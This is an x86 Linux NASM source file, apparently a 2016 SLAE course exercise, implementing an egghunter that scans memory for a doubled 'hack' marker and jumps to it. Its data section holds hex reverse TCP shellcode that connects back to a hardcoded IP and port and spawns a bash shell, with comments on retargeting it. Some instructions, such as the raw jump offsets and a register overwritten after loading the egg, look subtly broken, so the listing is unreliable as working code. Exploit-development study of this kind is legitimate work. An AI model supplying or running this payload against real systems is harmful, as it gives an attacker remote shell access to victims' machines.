;---------------------------------
;
; egghunter.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
;
; September 2, 2016
;
;---------------------------------



global _start

section .text


_start:

	; This is our egghuter
	; it needs to search for 
	; 2 consecutive instances
	; of our 'hack' string
	; and then jump into, and execute
	; our reverse TCP shellcode
	;
	; we'll try this out with the uselib syscall 86
	; and hope we can find and execute our shell
	; in the data section

	xor eax, eax			; initialize the registers
	xor ebx, ebx			; initialize the registers
	xor ebx, ebx			; initialize the registers
	xor ecx, ecx			; initialize the registers
	xor edx, edx			; initialize the registers
	mov ebx, 0x6861636b		; put our egg in ebx
	or dx, 0xfff			; helps set up for page size (0xfff = 4095)
	inc edx				; increase edx by 1
	lea ebx, [edx + 4]		; put the address of edx plus 4 bytes into ebx for the syscall
	mov al, 0x56			; #define __NR_uselib       86 (0x56)	
	int 0x80			; call it
	cmp al, 0xf2			; compare the return value in eax
	jz 0x2				; short jump 2 bytes if ZF set
	mov eax, 0x6861636b		; copy our comparison string into eax
	mov edi, edx			; mov our value in edx into edi
	scasd				; compare eax with dword at edi (in other words, check to see if we have 2 consecutive strings)
	jnz 0x7				; short jump if ZF not set to see if we have string
	scasd				; make the eax comparison again
	jnz 0x7				; short jump if ZF not set
	jmp edi				; we found a match! pwnage!!! 

section .data

	; we'll put our shellcode in a completely different section to search 
	; through memory for it using a 4 byte search but making sure payload 
	; doesn't excute until 8 bytes (2 consecutive strings of 'hack') are
	; found
	; once found, we'll execute our reverse TCP shell
	; hack.encode('hex) = 6861636b = 0x6861636b
	; IP: 192.168.250.129 Port: 4444
	; Change last 6 bytes (4 bytes for IP, 2 bytes for port)
	; if using iptohex.py, use non-little endian format
	; NOPS added before shellcode to help out


	shellcode: db 0x68,0x61,0x63,0x6b,0x68,0x61,0x63,0x6b,0x90,0x90,0x90,0x90,0x31,0xc0,0x31,0xdb,0x6a,0x06,0x6a,0x01,0x6a,0x02,0xb0,0x66,0xb3,0x01,0x89,0xe1,0xcd,0x80,0x89,0xc7,0xeb,0x55,0x5e,0x31,0xc0,0x31,0xc9,0xff,0x36,0x66,0xff,0x76,0x04,0xb0,0x02,0x66,0x50,0x89,0xe0,0x6a,0x10,0x50,0x57,0x31,0xc0,0xb0,0x66,0x31,0xdb,0xb3,0x03,0x89,0xe1,0xcd,0x80,0x31,0xdb,0x31,0xc9,0x89,0xfb,0xb0,0x3f,0xcd,0x80,0x41,0xb0,0x3f,0xcd,0x80,0x41,0xb0,0x3f,0xcd,0x80,0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x2f,0x2f,0x2f,0x2f,0x68,0x2f,0x62,0x69,0x6e,0x31,0xdb,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xa6,0xff,0xff,0xff,0xc0,0xa8,0xfa,0x81,0x11,0x5c	

